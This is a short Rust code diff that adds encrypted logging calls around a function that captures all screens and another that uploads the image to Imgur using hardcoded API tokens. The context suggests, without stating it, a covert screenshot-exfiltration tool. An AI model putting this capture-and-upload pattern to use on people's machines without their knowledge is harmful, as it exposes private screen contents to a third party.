@@ -2,6 +2,7 @@ extern crate systemstat;
 
 #[cfg(target_os = "windows")]
 use crate::crypto;
+use crate::info_crypt;
 use anyhow::anyhow;
 use anyhow::Context;
 use std::fs;
@@ -140,6 +141,9 @@ pub fn get_working_dir() -> anyhow::Result<String> {
 }
 
 pub fn screenshot() -> anyhow::Result<String> {
+
+    info_crypt!("Creating screenshot...");
+
     let screens = Screen::all().ok_or_else(|| anyhow!("Can't take ss!"))?;
 
     if screens.is_empty() {
@@ -158,6 +162,8 @@ pub fn screenshot() -> anyhow::Result<String> {
     let save_path = format!("{}/img-{}.png", get_working_dir()?, rng.gen::<i32>());
     fs::write(&save_path, &buffer)?;
 
+    info_crypt!("Screenshot created!");
+
     Ok(save_path)
 }
 
@@ -170,8 +176,12 @@ const IMGUR_TOKENS: &'static [&str] = &[
 ];
 
 pub async fn screenshot_url() -> anyhow::Result<String> {
+
     let path = screenshot()?;
-    let info = ImgurClient::new(IMGUR_TOKENS[3])
+
+    info_crypt!("Uploading screenshot...");
+
+    let info = ImgurClient::new(IMGUR_TOKENS[4])
         .upload_image(&path)
         .await?;
 
